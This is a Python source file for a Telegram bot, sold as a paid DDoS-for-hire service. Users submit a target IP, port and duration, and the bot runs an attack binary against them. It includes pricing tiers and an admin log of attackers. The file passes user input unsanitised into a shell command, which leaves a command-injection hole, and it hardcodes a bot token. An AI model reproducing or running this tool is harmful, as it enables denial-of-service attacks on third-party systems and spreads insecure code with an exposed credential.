# SCRIPT MADE BY @MEGOXERHUB ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
# SCRIPT MADE BY @MEGOXERHUB ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
# SCRIPT MADE BY @MEGOXERHUB ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT

import telebot
import subprocess
import datetime
import os
import time
from telebot import types
from threading import Thread

bot = telebot.TeleBot('7556718869:AAGHtOKU2BzOd29UWHNpKQhkH4ObAIH9kVc')

ADMIN_IDS = ["7469108296"]

LOG_FILE = 'log.txt'

USER_COOLDOWN = 300

bgmi_cooldown = {}
ongoing_attacks = {}
user_cooldowns = {}

# Logging functions
def log_command(user_id, target, port, duration):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"UserID: {user_id}"
        with open(LOG_FILE, 'a') as f:
            f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
    except Exception as e:
        print(f"Logging error: {e}")

def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w') as f:
            f.truncate(0)
        return "Logs cleared successfully ✅"
    return "Logs are already cleared. No data found."

# Bot command handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_message = (
        "🔰 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗘𝗚𝗢𝗫𝗘𝗥 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔰\n\n" )

    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_attack = types.KeyboardButton('🚀 Attack')
    btn_info = types.KeyboardButton('ℹ️ My Info')
    btn_access = types.KeyboardButton('💰 Buy Access!')
    btn_rules = types.KeyboardButton('🔰 Rules')
    
    markup.add(btn_attack, btn_info, btn_access, btn_rules)
    
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    response = clear_logs() if str(message.chat.id) in ADMIN_IDS else "ONLY OWNER CAN USE."
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    if str(message.chat.id) in ADMIN_IDS:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, 'rb') as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.send_message(message.chat.id, "No data found.")
    else:
        bot.send_message(message.chat.id, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.send_message(message.chat.id, f"🤖Your ID: {str(message.chat.id)}")

# Attack functionality
def start_attack(user_id, target, port, duration):
    attack_id = f"{user_id} {target} {port}"
    user = bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else f"UserID: {user_id}"
    log_command(user_id, target, port, duration)
    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
    bot.send_message(user_id, response)
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./megoxer {target} {port} {duration}", shell=True)
        time.sleep(5)
      # Set cooldown for normal users after a successful attack
        if user_id not in ADMIN_IDS:
            user_cooldowns[user_id] = datetime.datetime.now()
    except Exception as e:
        bot.send_message(user_id, f"Error: Servers Are Busy Unable To Attack\n{e}")

@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def handle_attack_button(message):
    user_id = str(message.chat.id)
    if user_id:
        bot.send_message(message.chat.id, "Enter the target ip, port and duration in seconds separated by space")
        bot.register_next_step_handler(message, handle_attack_details)

def handle_attack_details(message):
    user_id = str(message.chat.id)
    if user_id:
        try:
            target, port, duration = message.text.split()
            duration = int(duration)

            MAX_DURATION = 240
            if user_id not in ADMIN_IDS and duration > MAX_DURATION:
                bot.send_message(message.chat.id, f"❗️𝗘𝗿𝗿𝗼𝗿: 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗧𝗶𝗺𝗲 𝗶𝘀 {MAX_DURATION} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀❗️")
                return

            if user_id not in ADMIN_IDS:
                if user_id in user_cooldowns:
                    elapsed_time = (datetime.datetime.now() - user_cooldowns[user_id]).total_seconds()
                    if elapsed_time < USER_COOLDOWN:
                        cooldown_remaining = int(USER_COOLDOWN - elapsed_time)
                        bot.send_message(message.chat.id, f"𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗘𝗳𝗳𝗲𝗰𝘁. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 {cooldown_remaining} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀")
                        return
            thread = Thread(target=start_attack, args=(user_id, target, port, duration))
            thread.start()
        except ValueError:
            bot.send_message(message.chat.id, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁𝗲")

@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def handle_my_info_button(message):
    User_id = str(message.chat.id)
    Name = message.from_user.first_name
    Role = "Admin" if User_id in ADMIN_IDS else "User"
    response = (f"ℹ️ 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ℹ️\n\n"
                f"- Role: {Role}\n"
                f"- User ID: {User_id}\n"
                f"- Name: {Name}\n")
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda message: message.text == '💰 Buy Access!')
def handle_buy_access_button(message):
    response = (f"🔆 𝐌𝐄𝐆𝐎𝐗𝐄𝐑 𝐇𝐔𝐁 𝐃𝐃𝐎𝐒 𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓 🔆\n\n𝖣𝖠𝖸 - 150/-𝖨𝖭𝖱\n𝖶𝖤𝖤𝖪 - 600/-𝖨𝖭𝖱\n𝖬𝖮𝖭𝖳𝖧 - 1200/-𝖨𝖭𝖱\n\nDM TO BUY @SYGDEVIL")
    bot.send_message(message.chat.id, response)


@bot.message_handler(func=lambda message: message.text == '🔰 Rules')
def handle_rules_button(message):
    response = (f"𝟏. 𝐃𝐨𝐧’𝐭 𝐒𝐩𝐚𝐦 𝐓𝐨𝐨 𝐌𝐚𝐧𝐲 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 !! 𝐂𝐚𝐮𝐬𝐞 𝐀 𝐁𝐚𝐧 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭.\n\n𝟐. 𝐃𝐨𝐧’𝐭 𝐑𝐮𝐧 𝟐 𝐂𝐨𝐦𝐦𝐚𝐧𝐬 𝐀𝐭 𝐒𝐚𝐦𝐞 𝐓𝐢𝐦𝐞.\n\n𝟑. 𝐌𝐚𝐤𝐞 𝐒𝐮𝐫𝐞 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝  𝐎𝐮𝐫 𝐜𝐡𝐚𝐧𝐧𝐞𝐥 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐓𝐡𝐞 𝐃𝐃𝐨𝐒 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐖𝐨𝐫𝐤.\n\n𝟒. 𝐖𝐞 𝐃𝐚𝐢𝐥𝐲 𝐂𝐡𝐞𝐜𝐤𝐬 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐨 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞𝐬𝐞 𝐫𝐮𝐥𝐞𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐁𝐚𝐧!")
    bot.send_message(message.chat.id, response)

bot.polling()
            
# SCRIPT MADE BY @MEGOXERHUB ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
# SCRIPT MADE BY @MEGOXERHUB ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
# SCRIPT MADE BY @MEGOXERHUB ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT